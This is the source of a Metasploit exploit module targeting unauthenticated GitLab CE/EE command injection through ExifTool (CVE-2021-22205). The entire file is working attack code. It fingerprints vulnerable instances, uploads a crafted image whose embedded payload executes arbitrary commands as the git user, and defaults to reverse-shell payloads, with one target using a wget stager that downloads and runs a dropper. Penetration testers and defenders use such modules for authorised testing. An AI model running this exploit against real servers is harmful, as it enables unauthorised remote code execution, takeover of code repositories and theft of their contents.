##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GitLab Unauthenticated Remote ExifTool Command Injection',
        'Description' => %q{
          This module exploits an unauthenticated file upload and command
          injection vulnerability in GitLab Community Edition (CE) and
          Enterprise Edition (EE). The patched versions are 13.10.3, 13.9.6,
          and 13.8.8.

          Exploitation will result in command execution as the git user.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'William Bowling',  # Vulnerability discovery and CVE-2021-22204 PoC
          'jbaines-r7'        # Metasploit module
        ],
        'References' => [
          [ 'CVE', '2021-22205' ], # GitLab
          [ 'CVE', '2021-22204' ], # ExifTool
          [ 'URL', 'https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/' ],
          [ 'URL', 'https://hackerone.com/reports/1154542' ],
          [ 'URL', 'https://attackerkb.com/topics/D41jRUXCiJ/cve-2021-22205/rapid7-analysis' ],
          [ 'URL', 'https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/' ]
        ],
        'DisclosureDate' => '2021-04-14',
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' => false,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_openssl'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => ['wget'],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x86/meterpreter_reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 1,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/'])
    ])
  end

  def upload_file(file_data, timeout = 20)
    random_filename = "#{rand_text_alphanumeric(6..12)}.jpg"
    multipart_form = Rex::MIME::Message.new
    multipart_form.add_part(
      file_data,
      'image/jpeg',
      'binary',
      "form-data; name=\"file\"; filename=\"#{random_filename}\""
    )

    random_uri = normalize_uri(target_uri.path, rand_text_alphanumeric(6..12))
    print_status("Uploading #{random_filename} to #{random_uri}")
    send_request_cgi({
      'method' => 'POST',
      'uri' => random_uri,
      'ctype' => "multipart/form-data; boundary=#{multipart_form.bound}",
      'data' => multipart_form.to_s
    }, timeout)
  end

  def check
    # Checks if the instance is a GitLab install by looking for
    # the 'About GitLab' footer. If that's success a bogus jpg
    # image is uploaded to a bogus URI. The patched versions
    # should never send the bad image to ExifTool, resulting in
    # a 404. The unpatched versions should feed the image to
    # the vulnerable ExifTool, resulting in a 422 error message.

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/users/sign_in')
    })

    unless res
      return CheckCode::Unknown('Target did not respond to check.')
    end

    unless res.code == 200 && res.body.include?('>About GitLab<')
      return CheckCode::Safe('Not a GitLab web interface')
    end

    res = upload_file(rand_text_alphanumeric(6..32))
    unless res
      return CheckCode::Detected('The target did not respond to the upload request.')
    end

    case res.code
    when 422
      if res.body.include?('The change you requested was rejected.')
        return CheckCode::Vulnerable('The error response indicates ExifTool was executed.')
      end
    when 404
      if res.body.include?('The page could not be found')
        return CheckCode::Safe('The error response indicates ExifTool was not run.')
      end
    end

    return CheckCode::Detected
  end

  def execute_command(cmd, _opts = {})
    # header and trailer are taken from William Bowling's
    # echo_vakzz.jpg from their original h1 disclosure. The
    # 'cmd' variable is sandwiched in a qx{} function.
    payload_header = Base64.decode64('QVQmVEZPUk0AAAOvREpWTURJUk0AAAAugQACAAAARgAAAKz//96/mSAhyJFO6wwHH9LaiOhr5kQPLHEC7knTbpW9osMiP0ZPUk0AAABeREpWVUlORk8AAAAKAAgACBgAZAAWAElOQ0wAAAAPc2hhcmVkX2Fubm8uaWZmAEJHNDQAAAARAEoBAgAIAAiK5uGxN9l/KokAQkc0NAAAAAQBD/mfQkc0NAAAAAICCkZPUk0AAAMHREpWSUFOVGEAAAFQKG1ldGFkYXRhCgkoQ29weXJpZ2h0ICJcCiIgLiBxeHs=')
    payload = cmd
    payload_trailer = "} . \\\x0a\" b \") )" + (' ' * 421)

    res = upload_file(payload_header + payload + payload_trailer, 5)
    if res
      fail_with(Failure::UnexpectedReply, "The target replied with HTTP status #{res.code}. No reply was expected.")
    end

    print_good('Exploit successfully executed.')
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end
  end
end
